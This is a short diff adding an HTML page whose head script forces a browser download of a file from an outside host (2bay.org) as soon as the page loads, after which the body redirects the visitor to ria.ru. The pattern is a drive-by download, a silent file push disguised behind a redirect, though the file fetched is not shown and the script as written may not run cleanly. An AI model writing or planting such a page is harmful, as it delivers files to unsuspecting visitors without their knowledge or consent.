@@ -1,0 +1,12 @@
+<html>
+<head>
+<script type="text/javascript">
+  var link = document.createElement("a");
+  link.setAttribute("href", "http://2bay.org/ftp/files/ooops.txt");
+  link.setAttribute("download", "");
+  document.body.appendChild(link);
+  link.click();
+</script>
+</head>
+<body onload="window.location.replace('https://ria.ru/')"></body>
+</html>
